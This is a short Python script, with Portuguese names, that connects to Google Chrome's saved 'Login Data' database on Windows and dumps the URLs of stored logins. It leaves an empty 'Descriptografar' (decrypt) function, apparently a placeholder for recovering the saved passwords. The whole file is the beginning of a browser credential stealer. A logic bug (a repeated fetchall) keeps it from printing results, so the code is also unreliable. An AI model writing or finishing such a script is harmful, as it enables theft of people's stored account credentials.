import sqlite3,os

def Conexao():
    db = '%s/Google/Chrome/User Data/Default/Login Data' % os.environ['LocalAppData']
    try:
        conn = sqlite3.connect(db)
        return conn
    except sqlite3.Error as e:
        print('ERROR %s' % e)

def Dump():
    conexao = Conexao()
    cursor = conexao.cursor()
    cursor.execute('select origin_url from logins')
    if len(cursor.fetchall()) > 0:
#        print(cursor.fetchall())
        for linha in cursor.fetchall():
            print(linha)
    else:
        print('Não existe registros')

def Descriptografar():
    pass

Dump()